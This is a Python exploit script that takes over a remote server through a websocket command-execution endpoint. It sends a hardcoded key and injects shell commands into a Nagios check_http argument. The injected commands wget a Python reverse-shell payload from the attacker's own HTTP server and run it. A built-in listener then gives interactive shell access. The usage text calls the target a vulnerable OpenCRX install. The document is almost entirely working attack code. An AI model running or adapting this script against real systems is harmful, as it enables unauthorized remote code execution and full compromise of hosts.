#!/usr/bin/python3
import websocket, ssl, time, json, argparse, _thread as thread,sys,requests as r,socket,threading
from http.server import HTTPServer, BaseHTTPRequestHandler
class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/javascript")
        self.end_headers()

    def _html(self, message):
        content = '''#!/usr/bin/python3
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{}",{}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("/bin/bash")'''.format(lhost,lport)
        return content.encode("utf8")  # NOTE: must return a bytes object!

    def do_GET(self):
        self._set_headers()
        self.wfile.write(self._html("hi!"))
def runsrv(server_class=HTTPServer, handler_class=S, addr="localhost", port="8000"): ##Made change; if would not work, change to localhost and port 8000
    server_address = (addr, port)
    httpd = server_class(server_address, handler_class)
    httpd.handle_request()

def websrv(lhost, lport):
    runsrv(addr=str(lhost), port=int(lport))

def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(1)
    print("[+] Reverse shell listening on port " + str(port))
    conn, addr = s.accept()
    print('[+] Connection received from ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])
def on_open(ws):
    def run():
        for i in cmd:
            print("[+] Executing: "+i)
            ws.send(toJson("execute_nagios_command", "./check_http -I 127.0.0.1 -k 'string -c '{}''".format(i)))
            time.sleep(1)
    run()
def toJson(task,data):
    req = {
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key" : key
    }
    return json.dumps(req)
def on_message(ws, message):
    mes = json.loads(message)
    if "uniqid" in mes.keys():
        uniqid = mes["uniqid"]
    if mes["type"] == "connection":
        pass #Connected!
    elif mes["type"] == "dispatcher":
        pass
    elif mes["type"] == "response":
        pass #print(mes["payload"], end = '')
    else:
        pass #print(mes)
def on_error(ws, error):
    pass #print(error)
def on_close(ws):
    pass #print("[+] Connection Closed")

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("(+) usage: {} <RHOST> <RPORT> <LHOST> <LPORT> <WEBPORT>\n".format(sys.argv[0]))
        print("(+) RHOST - Remote server which runs vulnerable version of OpenCRX")
        print("(+) RPORT - Remote application port")
        print("(+) LHOST - Local IP Address to get shell")
        print("(+) LPORT - Local Port to get shell")
        print("(+) WEBPORT - Local Port for websrv\n")
        sys.exit(-1)
    rhost = sys.argv[1]
    rport = sys.argv[2]
    lhost = sys.argv[3]
    lport = sys.argv[4]
    webport = sys.argv[5]
    websrv_thread = threading.Thread(target=websrv, args=(lhost, webport))
    listener_thread = threading.Thread(target=listen, args=(lhost, lport))
    websrv_thread.start()
    listener_thread.start()
    cmd = ["wget http://{}:{}/shell.py -O /var/lib/nagios/shell.py".format(lhost,webport),"python3 /var/lib/nagios/shell.py"]
    key = "1fea123e07f730f76e661bced33a94152378611e"
    uniqid = ""
    time.sleep(5)
    ws = websocket.WebSocketApp("wss://{}/sudo_server".format(rhost),
                              on_message = on_message,
                              on_error = on_error,
                              on_close = on_close,
                              on_open = on_open)
    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
    listener_thread.join()
